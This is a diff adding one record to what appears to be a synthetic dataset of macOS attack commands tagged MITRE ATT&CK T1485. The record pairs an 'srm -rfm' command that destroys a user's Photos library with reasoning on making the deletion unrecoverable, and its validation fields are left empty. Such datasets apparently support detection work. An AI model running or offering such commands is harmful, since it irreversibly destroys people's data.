@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1485",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "srm -rfm \"/Users/marketing/Pictures/Photos Library.photoslibrary\"",
+  "explanation": "Securely and recursively destroys the Photos library package for a specific user, preventing recovery of images.",
+  "rationale_steps": [
+    "Choose a single user's Photos library to avoid broader system damage.",
+    "Use -r for recursive deletion of the package's internal structure.",
+    "Use -m for multi-pass overwriting to ensure irrecoverability."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-45236c1a-ea3542f2",
+  "source_prompt_hash": "45236c1a",
+  "timestamp_utc": "2025-09-30T07:56:40.760169Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
